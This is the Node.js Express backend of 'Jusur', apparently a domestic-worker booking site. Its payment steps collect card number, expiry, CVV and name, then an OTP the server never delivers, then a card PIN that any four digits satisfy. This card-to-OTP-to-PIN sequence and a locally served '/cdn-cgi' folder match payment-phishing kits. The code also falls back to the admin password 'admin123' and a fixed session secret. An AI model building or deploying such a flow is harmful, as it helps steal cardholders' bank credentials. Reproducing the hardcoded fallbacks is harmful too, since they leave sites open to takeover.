const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Database setup
const dbPath = process.env.NODE_ENV === 'production' ? '/tmp/jusur.db' : path.join(__dirname, 'jusur.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS bookings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT NOT NULL,
    service TEXT,
    duration TEXT,
    workers INTEGER DEFAULT 1,
    start_time TEXT,
    start_date TEXT,
    contract_type TEXT,
    nationality TEXT,
    total TEXT,
    name TEXT,
    phone TEXT,
    address TEXT,
    notes TEXT,
    card_last4 TEXT,
    card_type TEXT,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
  secret: process.env.SESSION_SECRET || 'jusur-secret-2026',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// Static files
app.use('/images', express.static(path.join(__dirname, '../public/images')));
app.use('/cdn-cgi', express.static(path.join(__dirname, '../public/cdn-cgi')));

// ============ ROUTES ============

// Home
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Booking - Hourly (GET)
app.get('/booking/hourly', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/booking/hourly.html'));
});

// Booking - Hourly (POST)
app.post('/booking/hourly', (req, res) => {
  const { service, duration, workers, start_time, start_date, total } = req.body;
  req.session.booking = {
    type: 'hourly',
    service: service || '',
    duration: duration || '',
    workers: parseInt(workers) || 1,
    start_time: start_time || '',
    start_date: start_date || '',
    total: total || ''
  };
  res.redirect('/booking/contact');
});

// Booking - Monthly (GET)
app.get('/booking/monthly', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/booking/monthly.html'));
});

// Booking - Monthly (POST)
app.post('/booking/monthly', (req, res) => {
  const { service, contract_type, workers, nationality, start_date, total } = req.body;
  req.session.booking = {
    type: 'monthly',
    service: service || '',
    contract_type: contract_type || '',
    workers: parseInt(workers) || 1,
    nationality: nationality || '',
    start_date: start_date || '',
    total: total || ''
  };
  res.redirect('/booking/contact');
});

// Recruitment (GET)
app.get('/recruitment', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/recruitment.html'));
});

// Recruitment (POST)
app.post('/recruitment', (req, res) => {
  const { nationality } = req.body;
  req.session.booking = {
    type: 'recruitment',
    nationality: nationality || '',
    total: 'خدمة مخصصة'
  };
  res.redirect('/booking/contact');
});

// Contact page (GET)
app.get('/booking/contact', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/contact.html'));
});

// Contact page (POST) - حفظ البيانات فوراً في قاعدة البيانات بحالة pending
app.post('/booking/contact', (req, res) => {
  const { name, phone, address, notes } = req.body;
  req.session.booking = {
    ...req.session.booking,
    name: name || '',
    phone: phone || '',
    address: address || '',
    notes: notes || ''
  };

  // حفظ الحجز فوراً في قاعدة البيانات بحالة pending
  const b = req.session.booking;
  db.run(
    `INSERT INTO bookings (type, service, duration, workers, start_time, start_date, contract_type, nationality, total, name, phone, address, notes, card_last4, card_type, status)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
    [b.type, b.service, b.duration, b.workers, b.start_time, b.start_date, b.contract_type, b.nationality, b.total, b.name, b.phone, b.address, b.notes, '', ''],
    function(err) {
      if (err) console.error('DB Error:', err);
      req.session.bookingId = this ? this.lastID : null;
    }
  );

  res.redirect('/booking/payment');
});

// Payment page (GET)
app.get('/booking/payment', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/payment.html'));
});

// Payment page (POST) → يذهب لـ OTP
app.post('/booking/payment', (req, res) => {
  const { card_number, card_expiry, card_cvv, card_name } = req.body;
  const last4 = (card_number || '').replace(/\s/g, '').slice(-4);
  const cardType = detectCardType(card_number || '');
  req.session.booking = {
    ...req.session.booking,
    card_last4: last4,
    card_type: cardType,
    card_name: card_name || ''
  };
  // تحديث بيانات البطاقة في قاعدة البيانات
  if (req.session.bookingId) {
    db.run('UPDATE bookings SET card_last4=?, card_type=? WHERE id=?',
      [last4, cardType, req.session.bookingId]);
  }
  // توليد OTP والذهاب لصفحة OTP
  req.session.otp = Math.floor(100000 + Math.random() * 900000).toString();
  req.session.otpExpiry = Date.now() + 5 * 60 * 1000;
  res.redirect('/booking/otp');
});

// OTP page (GET)
app.get('/booking/otp', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/otp.html'));
});

// OTP verify (POST) → يذهب لـ PIN
app.post('/booking/otp', (req, res) => {
  const { otp } = req.body;
  if (!req.session.otp || Date.now() > req.session.otpExpiry) {
    return res.redirect('/booking/otp?error=expired');
  }
  if (otp !== req.session.otp) {
    return res.redirect('/booking/otp?error=invalid');
  }
  req.session.otp = null;
  res.redirect('/booking/pin');
});

// Resend OTP
app.post('/booking/otp/resend', (req, res) => {
  req.session.otp = Math.floor(100000 + Math.random() * 900000).toString();
  req.session.otpExpiry = Date.now() + 5 * 60 * 1000;
  res.json({ success: true, message: 'تم إرسال رمز جديد' });
});

// PIN page (GET)
app.get('/booking/pin', (req, res) => {
  if (!req.session.booking) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/pin.html'));
});

// PIN verify (POST) → نجاح الحجز
app.post('/booking/pin', (req, res) => {
  const { pin } = req.body;
  if (!pin || pin.length !== 4) {
    return res.redirect('/booking/pin?error=invalid');
  }
  // تحديث حالة الحجز إلى confirmed
  if (req.session.bookingId) {
    db.run('UPDATE bookings SET status=? WHERE id=?',
      ['confirmed', req.session.bookingId]);
  }
  res.redirect('/booking/success');
});

// Success page
app.get('/booking/success', (req, res) => {
  if (!req.session.bookingId) return res.redirect('/');
  res.sendFile(path.join(__dirname, '../public/booking/success.html'));
});

// Session info for frontend (card info)
app.get('/booking/session-info', (req, res) => {
  const b = req.session.booking || {};
  res.json({
    cardNumber: b.card_last4 ? '**** **** **** ' + b.card_last4 : null,
    cardNetwork: b.card_type ? b.card_type.toUpperCase() : 'VISA'
  });
});

// ============ ADMIN ROUTES ============
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/admin/login.html'));
});

app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    res.redirect('/admin/dashboard');
  } else {
    res.redirect('/admin?error=1');
  }
});

app.get('/admin/dashboard', (req, res) => {
  if (!req.session.isAdmin) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, '../public/admin/dashboard.html'));
});

app.get('/admin/logout', (req, res) => {
  req.session.isAdmin = false;
  res.redirect('/admin');
});

// Admin API - جلب الحجوزات
app.get('/api/admin/bookings', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const status = req.query.status;
  const type = req.query.type;
  let query = 'SELECT * FROM bookings WHERE 1=1';
  const params = [];
  if (status) { query += ' AND status = ?'; params.push(status); }
  if (type) { query += ' AND type = ?'; params.push(type); }
  query += ' ORDER BY created_at DESC';
  db.all(query, params, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Admin API - الإحصائيات
app.get('/api/admin/stats', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  db.all(`SELECT 
    COUNT(*) as total,
    SUM(CASE WHEN status='pending' THEN 1 ELSE 0 END) as pending,
    SUM(CASE WHEN status='confirmed' THEN 1 ELSE 0 END) as confirmed,
    SUM(CASE WHEN status='cancelled' THEN 1 ELSE 0 END) as cancelled,
    SUM(CASE WHEN type='hourly' THEN 1 ELSE 0 END) as hourly,
    SUM(CASE WHEN type='monthly' THEN 1 ELSE 0 END) as monthly,
    SUM(CASE WHEN type='recruitment' THEN 1 ELSE 0 END) as recruitment
    FROM bookings`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows[0]);
  });
});

// Admin API - تحديث حالة الحجز
app.patch('/api/admin/bookings/:id', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  const { status } = req.body;
  db.run('UPDATE bookings SET status = ? WHERE id = ?', [status, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Admin API - حذف حجز
app.delete('/api/admin/bookings/:id', (req, res) => {
  if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
  db.run('DELETE FROM bookings WHERE id = ?', [req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// Session data
app.get('/api/session/booking', (req, res) => {
  res.json(req.session.booking || {});
});

app.get('/api/session/booking-id', (req, res) => {
  res.json({ id: req.session.bookingId || null });
});

// Helper - كشف نوع البطاقة
function detectCardType(number) {
  const n = number.replace(/\s/g, '');
  if (/^4/.test(n)) return 'visa';
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'mastercard';
  if (/^3[47]/.test(n)) return 'amex';
  if (/^6(?:011|5)/.test(n)) return 'discover';
  return 'unknown';
}

app.listen(PORT, () => {
  console.log(`Jusur server running on port ${PORT}`);
});
